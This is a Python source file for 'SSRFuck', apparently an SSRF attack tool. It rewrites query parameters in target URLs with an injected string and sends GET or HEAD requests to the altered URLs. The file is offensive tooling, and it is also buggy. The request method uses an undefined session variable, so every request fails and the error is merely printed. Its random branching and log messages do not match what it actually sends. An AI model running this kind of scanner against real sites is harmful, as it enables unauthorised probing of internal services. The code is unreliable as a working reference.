from requests import Session
from termcolor import colored
from random import randint as rdi
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

from lib.ParamReplacer import ParamReplace
from lib.PathFunctions import PathFunction
from lib.Globals import ColorObj

class SSRFuck:
    def __init__(self):
        self.Replacer = ParamReplace()
        self.Function = PathFunction()
        self.s = Session()

    def gen_payloads(self, URLs: list, replace_str: str) -> tuple:
        payloads_url = []
        for URL in URLs:   
            print(f"{ColorObj.information} Generating payload for: {colored(URL, color='cyan')}")
            half_payload = urlparse(URL)
            if not half_payload.query:
                continue
            else:
                param, value = self.Replacer.expand_parameter(half_payload.query)
                replacer_list = self.Replacer.replacement(param, value, replace_str)
                full_payload = self.Replacer.gen_url(self.Function.urler('') + half_payload.netloc + half_payload.path, replacer_list)
                payloads_url.append(full_payload)
        return payloads_url
 
    def gethead(self, URL: str) -> bool:
        try:
            if rdi(0,1) == 0:
                print(f"{ColorObj.good} Trying to get {colored(URL, color='cyan')}")
                s.get(URL, timeout=9)
            elif rdi(0,1) == 1:
                print(f"{ColorObj.good} Trying to head {colored(URL, color='cyan')}")
                s.head(URL, timeout=9)
            else:
                print(f"{ColorObj.good} Trying to get {colored(URL, color='cyan')}")
                s.head(URL, timeout=9)
        except Exception as E:
            print(E,E.__class__)
